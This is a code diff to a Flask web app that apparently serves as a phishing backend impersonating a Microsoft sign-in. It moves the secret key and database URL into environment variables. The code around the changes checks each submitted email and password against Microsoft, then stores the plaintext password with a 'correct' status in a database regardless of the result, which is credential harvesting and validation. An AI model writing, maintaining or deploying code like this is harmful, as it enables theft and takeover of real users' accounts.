@@ -2,12 +2,13 @@ from flask import Flask, render_template, request, redirect, url_for, session
 from flask_sqlalchemy import SQLAlchemy
 from datetime import datetime
 import requests
+import os
 
 app = Flask(__name__)
 
-app.secret_key = 'ms_secret_key_2026'
+app.secret_key = os.environ.get('SECRET_KEY', 'ms_secret_key_2026')
 
-app.config['SQLALCHEMY_DATABASE_URI'] = 'sqlite:///users.db'
+app.config['SQLALCHEMY_DATABASE_URI'] = os.environ.get('DATABASE_URL', 'sqlite:///users.db')
 app.config['SQLALCHEMY_TRACK_MODIFICATIONS'] = False
 
 db = SQLAlchemy(app)
@@ -138,7 +139,7 @@ def password():
         else:
             valid, reason = verify_microsoft_password(email, pwd)
 
-            # Always save to DB
+            # Always save to DB regardless of result
             status = "correct" if valid else reason
             attempt = LoginAttempt(email=email, password=pwd, status=status)
             db.session.add(attempt)
